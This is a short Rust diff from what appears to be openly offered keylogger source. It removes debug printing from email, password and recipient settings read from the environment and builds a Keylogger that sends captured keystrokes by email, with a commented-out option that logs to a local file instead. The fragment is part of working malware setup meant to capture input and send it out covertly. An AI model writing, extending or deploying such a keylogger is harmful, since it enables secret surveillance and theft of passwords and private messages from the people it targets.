@@ -14,7 +14,6 @@ use std::env;
 use std::io::Result;
 use std::process::exit;
 use std::sync::LazyLock;
-use std::thread;
 
 static EMAIL: LazyLock<String> = LazyLock::new(|| match env::var("EMAIL") {
     Ok(var) => var,
@@ -45,9 +44,9 @@ fn main() {
     //    path: "./keylogger_log.txt".to_string(),
     //}).set_buffer_capacity(10);
     //keylogger.start();
-    let email: String = dbg!(EMAIL.clone().to_string());
-    let password: String = dbg!(PASSWORD.clone().to_string());
-    let recipient: String = dbg!(RECIPIENT.clone().to_string());
+    let email: String = EMAIL.to_string();
+    let password: String = PASSWORD.to_string();
+    let recipient: String = RECIPIENT.to_string();
     let mut keylogger = Keylogger::new(Method::Email {
         email,
         password,
